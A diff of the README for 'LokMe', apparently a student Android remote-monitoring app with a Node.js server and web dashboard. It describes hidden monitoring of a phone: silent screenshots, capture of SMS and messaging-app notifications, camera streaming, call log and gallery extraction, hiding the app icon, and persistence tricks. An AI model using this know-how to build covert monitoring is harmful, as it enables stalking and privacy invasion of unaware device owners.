@@ -1,143 +1,279 @@
-# LokMe
+# 🛡️ LokMe — Nexus Dashboard
 
-Device Admin & Monitoring App — Android school project.
+> **Device Admin & Monitoring System** — Android Kotlin app + futuristic web dashboard + Node.js server on Render + Supabase backend.
 
-## Features
+<div align="center">
+  <img src="https://img.shields.io/badge/Kotlin-2.3.21-purple?logo=kotlin" alt="Kotlin">
+  <img src="https://img.shields.io/badge/Android-API_36-3DDC84?logo=android" alt="Android">
+  <img src="https://img.shields.io/badge/Node.js-Express-339933?logo=nodedotjs" alt="Node.js">
+  <img src="https://img.shields.io/badge/Supabase-Postgres-3ECF8E?logo=supabase" alt="Supabase">
+  <img src="https://img.shields.io/badge/Build-Gradle_8.12.1-02303A?logo=gradle" alt="Gradle">
+</div>
 
-- **Device Admin** — Lock device remotely
-- **Send Dialog** — Push messages to device screen
-- **Location Tracking** — GPS coordinates via Supabase
-- **Camera Capture** — Front/back camera photos
-- **Call Log Reader** — Read and upload call history
-- **Real-time WebSocket** — Instant command delivery
-- **Admin Dashboard** — Web panel to manage devices
-- **Screen Capture** — Silent screenshot via MediaProjection API
-- **Notification Capture** — Capture SMS, WhatsApp, Telegram in real-time
-- **Live Video Stream** — Real-time camera streaming to dashboard
-- **Play Alarm** — Remote alarm ringtone at max volume
-- **Vibrate Device** — Remote vibration control
-- **Gallery** — Browse device photos & videos, download via Supabase
-- **Calendar Reader** — Fetch last 7 days of calendar events
-- **Battery Status** — Auto-sends every 10s via WebSocket
-- **Battery Optimization Bypass** — Whitelist from doze mode
-- **Keep-Alive Service** — AccessibilityService auto-restarts on kill
-- **AccessibilityService** — Keeps CommandService alive
+---
 
-## Architecture
+## 🌟 Features
+
+| Category | Feature | Description |
+|----------|---------|-------------|
+| 🔐 **Device Control** | Remote Lock | Lock screen instantly via Device Admin API |
+| 💬 **Communication** | Push Dialog | Display custom alert on target device |
+| 📍 **Tracking** | GPS Location | Real-time coordinates via Supabase + Leaflet map |
+| 📸 **Surveillance** | Camera Capture | Front/back camera photos on demand |
+| 📞 **Data Harvest** | Call Log Reader | Extract last 50 call logs |
+| 🖥️ **Monitoring** | Screen Capture | Silent screenshot via MediaProjection API |
+| 🔔 **Interception** | Notification Capture | Real-time SMS, WhatsApp, Telegram capture |
+| 📺 **Streaming** | Live Video | Real-time camera stream to dashboard |
+| 🔊 **Audio** | Play Alarm | Remote alarm at max volume |
+| 📳 **Haptics** | Vibrate Device | Remote vibration control |
+| 🖼️ **Media** | Gallery Browser | Browse & download photos/videos via MediaStore |
+| 📅 **Calendar** | Calendar Reader | Fetch last 7 days of events |
+| 🔋 **Power** | Battery Status | Auto-sends every 10s via WebSocket |
+| ⚡ **Bypass** | Battery Optimization | Whitelist from doze mode |
+| ♻️ **Persistence** | Keep-Alive Service | AccessibilityService auto-restarts on kill |
+| 👻 **Stealth** | Hide/Show App | Toggle launcher icon visibility |
+
+---
+
+## 🏗️ Architecture
 
 ```
-Android App (Kotlin) ←→ Node.js Server (Express + WS) ←→ Supabase (DB + Storage)
-                                       ↓
-                              Web Admin Dashboard
+┌──────────────────┐     ┌──────────────────────────────┐     ┌──────────────────────┐
+│                  │     │                              │     │                      │
+│   📱 Android     │◄───►│   🌐 Node.js Server          │◄───►│   🗄️ Supabase        │
+│   App (Kotlin)   │  WS │   (Express + WebSocket)      │ REST│   (Postgres + S3)    │
+│                  │     │                              │     │                      │
+└──────────────────┘     └──────────┬───────────────────┘     └──────────────────────┘
+                                    │
+                                    ▼
+                          ┌──────────────────┐
+                          │                  │
+                          │   🖥️ Dashboard   │
+                          │   (HTML/CSS/JS)  │
+                          │                  │
+                          └──────────────────┘
 ```
 
-## Setup
+---
 
-### 1. Supabase
-- Create project at [supabase.com](https://supabase.com)
-- Go to SQL Editor → run `server/schema.sql`
+## 🚀 Quick Start
 
-### 2. Server (Render)
-- Push this repo to GitHub
-- On [render.com](https://render.com) → New Web Service
-- Build: `npm install` | Start: `node index.js`
-- Environment variables:
-  - `SUPABASE_URL` = your project URL
-  - `SUPABASE_KEY` = your service_role key
+### 1️⃣ Supabase Setup
 
-### 3. Android App
-- Open `android/` in Android Studio
-- Edit `LokMeApp.kt` → fill in Supabase URL, key, and server URL
-- Build and install on device
+```bash
+# Go to SQL Editor → paste & run:
+server/schema.sql
+```
 
-### 4. Dashboard
-- Open `https://your-server.onrender.com`
+### 2️⃣ Deploy Server (Render)
 
-## Commands
+```bash
+# Push to GitHub → New Web Service on render.com
+# Build: npm install
+# Start: node index.js
+# Env vars:
+#   SUPABASE_URL   = https://your-project.supabase.co
+#   SUPABASE_KEY   = your-service-role-key
+```
+
+### 3️⃣ Build Android App
+
+```bash
+# Open android/ in Android Studio
+# Edit LokMeApp.kt → fill in:
+#   - SUPABASE_URL
+#   - SUPABASE_KEY
+#   - SERVER_URL (https://your-server.onrender.com)
+# Build APK → install on device
+```
+
+### 4️⃣ Open Dashboard
+
+```
+https://your-server.onrender.com
+```
+
+---
+
+## 🎮 Command Reference
 
 | Command | Description |
 |---------|-------------|
-| `LOCK_DEVICE` | Lock screen immediately |
-| `SHOW_DIALOG` | Display alert dialog |
-| `GET_LOCATION` | Capture GPS coordinates |
-| `GET_CALL_LOG` | Read last 50 calls |
-| `CAPTURE_PHOTO` | Take photo (front/back) |
-| `CAPTURE_SCREEN` | Silent screenshot |
-| `START_VIDEO_STREAM` | Start live video stream |
-| `STOP_VIDEO_STREAM` | Stop live video stream |
-| `PLAY_ALARM` | Play alarm ringtone (configurable ms) |
-| `VIBRATE_DEVICE` | Vibrate device (configurable ms) |
-| `LIST_MEDIA` | Browse device photos & videos |
-| `DOWNLOAD_FILE` / `DOWNLOAD_VIDEO` | Download file to Supabase Storage |
-| `GET_CALENDAR` | Fetch last 7 days of calendar events |
-| `HIDE_APP` / `SHOW_APP` | Hide/unhide app launcher icon |
+| `🔒 LOCK_DEVICE` | Lock screen immediately |
+| `💬 SHOW_DIALOG` | Display alert dialog |
+| `📍 GET_LOCATION` | Capture GPS coordinates |
+| `📞 GET_CALL_LOG` | Read last 50 calls |
+| `📸 CAPTURE_PHOTO` | Take photo (front/back) |
+| `🖥️ CAPTURE_SCREEN` | Silent screenshot |
+| `📺 START_VIDEO_STREAM` | Start live video stream |
+| `⏹️ STOP_VIDEO_STREAM` | Stop live video stream |
+| `🔊 PLAY_ALARM` | Play alarm ringtone |
+| `📳 VIBRATE_DEVICE` | Vibrate device |
+| `🖼️ LIST_MEDIA` | Browse device gallery |
+| `⬇️ DOWNLOAD_FILE` / `DOWNLOAD_VIDEO` | Download to Supabase Storage |
+| `📅 GET_CALENDAR` | Fetch 7 days of events |
+| `👻 HIDE_APP` / `SHOW_APP` | Hide/unhide launcher icon |
 
-## Tech Stack
+---
 
-- **Android:** Kotlin, CameraX, FusedLocation, Device Admin API, OkHttp WebSocket, MediaProjection, MediaStore
-- **Server:** Node.js, Express, ws, Supabase JS
-- **Dashboard:** HTML/CSS/JS, Chart.js, Leaflet.js maps
-- **Database:** Supabase (PostgreSQL + Storage)
+## ⚙️ Build Config
 
-## Build Config
+```
+🔧 AGP 8.9.1     |  🅺 Kotlin 2.3.21
+📱 compileSdk 36  |  🎯 targetSdk 34
+🏗️ Gradle 8.12.1 |  📦 Supabase BOM 3.6.0
+📷 CameraX 1.4.1  |  📝 kotlinx-serialization-json 1.8.1
+```
 
-- AGP 8.9.1, Kotlin 2.3.21, compileSdk 36, targetSdk 34
-- Gradle 8.12.1, Supabase BOM 3.6.0, CameraX 1.4.1
+---
 
-## Project Phases, Errors & Struggles
+## 📚 Tech Stack
 
-### Phase 1 — Foundation
-- Set up Android project with Device Admin API, basic Supabase integration, CommandService lifecycle
-- No major issues
+<div align="center">
 
-### Phase 2 — Dashboard & Commands
-- Built web dashboard with real-time updates via WebSocket
-- Added location, camera, call log commands
-- **Struggle:** Command execution timing — commands sent before WebSocket connected would never reach the device. Fixed by adding a pending command queue on the server.
-- **Struggle:** Supabase PostgreSQL `created_at` default — column would be null on insert. Fixed by adding `DEFAULT timezone('utc'::text, now())` to schema.
+| Layer | Technology |
+|-------|-----------|
+| 📱 **Mobile** | Kotlin, CameraX, FusedLocation, Device Admin API, OkHttp WebSocket, MediaProjection, MediaStore |
+| 🌐 **Server** | Node.js, Express, ws, Supabase JS SDK |
+| 🖥️ **Dashboard** | HTML5, CSS3 (glassmorphism), Vanilla JS, Chart.js 4.4.7, Leaflet.js 1.9.4 |
+| 🗄️ **Database** | Supabase (PostgreSQL + Storage / S3-compatible) |
 
-### Phase 3 — Screen Capture (The Great Struggle)
-- Silent screenshot using MediaProjection API
-- **Error:** `MediaProjection` token expired after service restart — VirtualDisplay was null at capture time. Initially created VirtualDisplay once on startup, but it released on `onDestroy()`. **Fix:** recreating VirtualDisplay right before each capture + re-initializing from stored token if `mediaProjection` was null.
-- **Error:** `QueryMiniThumbnail` method doesn't exist on `MediaStore.Images.Thumbnails` — caused build failure. Fixed by querying the thumbnails `ContentUri` directory using `IMAGE_ID` / `VIDEO_ID` columns instead.
+</div>
 
-### Phase 4 — Notification Capture & Deduplication
-- Captured notifications (SMS, WhatsApp, Telegram) via NotificationListenerService
-- **Error:** Double notifications — Android inserted to Supabase via REST, AND server inserted on WS receive. Fixed by removing server-side insert; dashboard deduplicates via `seenNotifIds` Set.
-- **Error:** App names in dashboard were raw package names like `com.google.android.apps.messaging` instead of "SMS". Fixed by adding `getNotifBadgeClass()` + `getAppDisplay()` mapping.
+---
 
-### Phase 5 — File Browser → Gallery
-- Initially built a file browser using `File.listFiles()`
-- **Error:** On Android 11+, scoped storage prevents `listFiles()` from returning regular files — only directories appeared. Tried `MANAGE_EXTERNAL_STORAGE` permission but that requires user to grant it manually.
-- **Struggle:** Replaced with `MediaStore` queries for images & videos, showing thumbnails from `MediaStore.Images.Thumbnails` / `MediaStore.Video.Thumbnails`.
-- **Error:** The `filesPopup` HTML ID wasn't updated to match the JS — gallery button did nothing. Fixed by changing `id="filesPopup"` to `id="galleryPopup"`.
+## 📖 Project Journey — The Blood, Sweat & Tears
 
-### Phase 6 — Live Video Stream
-- Real-time camera streaming via binary WebSocket frames relayed to dashboard
-- **Struggle:** High resolution caused lag. Fixed by reducing to 320×240 at JPEG quality 30 for faster frames.
+### 🔰 Phase 1 — Foundation
+```
+✅ Android project with Device Admin API
+✅ Supabase integration
+✅ CommandService lifecycle
+✅ WebSocket connection with auto-reconnect
+```
+> *No major issues — smooth start.*
 
-### Phase 7 — Auto Battery Status
-- Phone sends battery level every 30s (originally) via WS without manual command
-- **Struggle:** Battery only updated when device selected — showed `--` on first open. Fixed by caching last value per device in `deviceBatteryCache` map, displayed instantly on `selectDevice()`.
+---
 
-### Phase 8 — Battery Interval Fix
-- User wanted 10s instead of 30s
-- Also wanted the dashboard label to match — changed "(auto 30s)" to "(auto 10s)"
+### ⚡ Phase 2 — Dashboard & Commands
+```
+✅ Real-time web dashboard
+✅ Location tracking, camera capture, call logs
+```
+> **😤 Struggle:** Commands sent before WebSocket connected never reached the device. **Fix:** Added a pending command queue on the server that replays on device connect.
+>
+> **😤 Struggle:** Supabase `created_at` column was `NULL` on insert. **Fix:** Added `DEFAULT timezone('utc'::text, now())` to the schema.
 
-### Phase 9 — Notification Colors & Labels
-- WhatsApp → green, SMS (Google Messages) → blue, Snapchat → yellow, TikTok → red
-- Custom display names instead of raw package names
-- Added color badge CSS classes for each app
+---
 
-### Phase 10 — Keep-Alive & Persistence
-- AccessibilityService auto-restarts CommandService when killed by system
-- BootReceiver starts service on device boot
-- App can hide its launcher icon
+### 🖥️ Phase 3 — Screen Capture (The Great Struggle)
+```
+✅ Silent screenshot via MediaProjection
+✅ VirtualDisplay + ImageReader pipeline
+```
+> **💥 Error:** `MediaProjection` token expired after service restart — VirtualDisplay was `null`. Initially created VirtualDisplay once on startup, but it was released in `onDestroy()`. **Fix:** Recreate VirtualDisplay right before each capture + re-init from stored token if `mediaProjection` is null.
+>
+> **💥 Error:** `queryMiniThumbnail()` doesn't exist on `MediaStore.Images.Thumbnails` — **build failed**. **Fix:** Query the thumbnails `ContentUri` directly using `IMAGE_ID` / `VIDEO_ID` columns instead. Added `getImageThumbnailPath()` and `getVideoThumbnailPath()` helper functions.
 
-### Persistent Challenges
+---
 
-1. **Scoped Storage (Android 11+):** The `File` API is severely restricted. MediaStore queries work for media but not for arbitrary files. Full file system access requires `MANAGE_EXTERNAL_STORAGE` which needs manual user grant.
-2. **MediaProjection Token Persistence:** The screen capture token from `createScreenCaptureIntent()` is valid only as long as the app process lives. After service restart, the token must be re-stored and recreated. Even then, Android may invalidate it at any time.
-3. **Background Process Limits:** Android aggressively kills services on API 26+. Solved by foreground service + AccessibilityService watchdog.
-4. **NotificationListenerService:** Only re-binds when user toggles the permission in settings. No programmatic re-binding possible.
-5. **WebSocket Stability:** Phone's WS connection drops on network changes. Reconnect logic with exponential backoff was essential.
+### 🔔 Phase 4 — Notification Capture & Deduplication
+```
+✅ Real-time SMS/WhatsApp/Telegram capture
+✅ Color-coded badges
+```
+> **💥 Error:** Double notifications — Android inserted to Supabase via REST **AND** server inserted on WS receive. **Fix:** Removed server-side insert; dashboard deduplicates via `seenNotifIds` `Set`.
+>
+> **💥 Error:** Raw package names like `com.google.android.apps.messaging` instead of "SMS". **Fix:** Added `getNotifBadgeClass()` + `getAppDisplay()` mapping logic.
+
+---
+
+### 📁→🖼️ Phase 5 — File Browser → Gallery
+```
+✅ Replaced broken file browser with MediaStore gallery
+✅ Thumbnails for images & videos
+✅ Direct download via Supabase Storage
+```
+> **💥 Error:** Android 11+ scoped storage — `File.listFiles()` returned only directories, no files. Tried `MANAGE_EXTERNAL_STORAGE` (requires manual user grant).
+>
+> **😤 Struggle:** Rewrote entirely with `MediaStore` queries for images & videos. Thumbnails from `MediaStore.Images.Thumbnails` and `MediaStore.Video.Thumbnails`.
+>
+> **💥 Error:** The HTML popup `id="filesPopup"` wasn't updated to `id="galleryPopup"` — gallery button did nothing. **Fix:** Matched HTML IDs with JS references.
+
+---
+
+### 📺 Phase 6 — Live Video Stream
+```
+✅ Real-time camera stream via binary WebSocket
+✅ Audio stream in parallel
+```
+> **😤 Struggle:** High resolution caused massive lag. **Fix:** Reduced to **320×240** at **JPEG quality 30** for smooth frames.
+
+---
+
+### 🔋 Phase 7 — Auto Battery Status
+```
+✅ Phone auto-sends battery every 30s (later 10s)
+✅ No manual command needed
+```
+> **😤 Struggle:** Battery showed `--` until first WS message arrived. **Fix:** Cached last value per device in `deviceBatteryCache` map — displayed instantly on device select.
+
+---
+
+### ⏱️ Phase 8 — Battery Interval Fix
+```
+✅ Changed 30s → 10s
+✅ Updated dashboard label
+```
+
+---
+
+### 🎨 Phase 9 — Notification Colors & Labels
+```
+WhatsApp  → 🟢 Green   (#25d366)
+SMS       → 🔵 Blue    (#3b82f6)
+Snapchat  → 🟡 Yellow  (#fffc00)
+TikTok    → 🔴 Red     (#ff2d55)
+Telegram  → 🩵 Cyan    (#0088cc)
+```
+
+---
+
+### ♻️ Phase 10 — Keep-Alive & Persistence
+```
+✅ AccessibilityService watchdog auto-restarts CommandService
+✅ BootReceiver starts on device boot
+✅ App can hide its launcher icon (stealth mode)
+```
+
+---
+
+## 🧗 Persistent Challenges
+
+| # | Challenge | Solution |
+|---|-----------|----------|
+| 1️⃣ | **📁 Scoped Storage (Android 11+)** — `File` API is severely restricted | Use `MediaStore` for media files; `MANAGE_EXTERNAL_STORAGE` for full access (manual grant) |
+| 2️⃣ | **🔄 MediaProjection Token** — Invalid after process restart | Store token in SharedPreferences; recreate VirtualDisplay on each capture |
+| 3️⃣ | **💀 Background Process Limits** — Android kills services aggressively | Foreground service + foregroundServiceType="connectedDevice" + AccessibilityService watchdog |
+| 4️⃣ | **🔕 NotificationListenerService** — Can't programmatically re-bind | User must toggle in system settings — no workaround |
+| 5️⃣ | **📶 WebSocket Stability** — Drops on network changes | Exponential backoff reconnect logic (1s → 2s → 4s → 8s → max 60s) |
+
+---
+
+## 👨‍💻 Made by
+
+<div align="center">
+  
+**SemDev Studio**
+  
+<br>
+  
+[![GitHub](https://img.shields.io/badge/GitHub-danielsem65-181717?logo=github)](https://github.com/danielsem65/LokMe)
+
+</div>
+
+---
+
+<div align="center">
+  <sub>Built with ☕, 😤, and many sleepless nights</sub>
+</div>
